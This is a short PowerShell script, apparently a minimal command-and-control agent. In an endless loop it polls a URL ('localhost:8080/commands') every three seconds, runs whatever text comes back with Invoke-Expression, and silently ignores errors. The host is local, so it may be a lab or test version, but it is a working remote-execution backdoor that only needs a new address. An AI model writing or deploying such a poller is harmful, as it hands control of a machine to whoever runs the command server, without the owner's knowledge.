$commands_host = "localhost:8080/commands"
$timeout_time = 3

while ($true) {
	try {
		$response = Invoke-WebRequest -Uri $commands_host
		iex $response.Content
	} catch {
		# Ignore
	}

	Start-Sleep -s $timeout_time
}